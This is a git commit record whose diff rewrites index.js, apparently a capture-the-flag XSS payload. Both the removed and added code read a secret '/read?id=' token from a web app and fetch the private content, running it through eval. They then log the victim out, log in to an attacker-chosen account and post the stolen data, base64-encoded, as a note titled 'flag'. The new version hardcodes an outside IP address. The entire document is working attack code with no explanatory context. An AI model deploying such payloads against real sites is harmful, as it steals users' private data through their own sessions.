bae73c911d59db00d8a3df30358b6e48e5bf2dec
as3617 <46442697+as3617@users.noreply.github.com>
2020-11-16 18:03:15 +0900

    Update index.js

--- index.js
+++ index.js
@@ -1,9 +1,8 @@
-var a = fetch("http://172.77.0.3:8080/",{redirect: 'follow'}).then(x=>x.text()).then(x=>x.substring(x.indexOf('/read?id=')+9,65))
-var data = fetch("/read/"+a).then(x=>x.text()).then(x=>eval(data=x));
-location.href='/logout';
-document.forms[0][1].value="aaaaaaaa";
-document.forms[0][0].value="aaaaaaaa";
-document.forms[0].submit();
-document.forms[0][0].value='flag';
-document.forms[0][1].value=btoa(data);
-document.forms[0].submit();
+fetch("http://211.239.124.243:18603/?").then(x=>x.text()).then(x=>eval("a=x.substring(x.indexOf('/read?id=')+9,x.indexOf('/read?id=')+73)"));
+fetch("http://211.239.124.243:18603/read/"+a+"?").then(x=>x.text()).then(x=>eval(data=JSON.stringify(x)));
+for(i=0;i<10000000;i++){}
+fetch("http://211.239.124.243:18603/logout?");
+for(i=0;i<10000000000;i++){}
+fetch("http://211.239.124.243:18603/login?",{body:"username=sdfsadfasdfasfd&password=sdfsadfasdfasfd",headers:{"Content-Type":"application/x-www-form-urlencoded"},method:"post",});
+for(i=0;i<10000000;i++){}
+fetch("http://211.239.124.243:18603/write?",{body:"title=flag&content="+btoa(data),headers:{"Content-Type":"application/x-www-form-urlencoded"},method:"post",});
